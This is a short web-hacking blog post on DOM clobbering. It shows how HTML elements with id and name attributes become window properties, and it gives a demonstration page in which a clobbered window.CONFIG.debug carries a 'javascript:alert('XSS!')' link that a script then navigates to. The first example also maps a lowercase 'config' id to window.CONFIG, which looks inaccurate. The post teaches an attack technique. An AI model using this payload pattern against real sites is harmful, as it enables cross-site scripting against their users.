---
title: Dom Clobbering
author: janger
date: 2023-09-25
category: Web Hacking
layout: post
---

~~~ html
<a id='CONFIG'> --> window.CONFIG;
<b id='CONFIG' name='debug'> --> window.CONFIG.debug;
<c id='config' name='main'> --> window.CONFIG.main;
~~~


~~~ html
<a id='CONFIG'>
<a id='CONFIG' name='debug' href="javascript:alert('XSS!')">

<script>
    window.onload = ()=> {
        location.href = window.CONFIG.debug;
    }
</script>
~~~
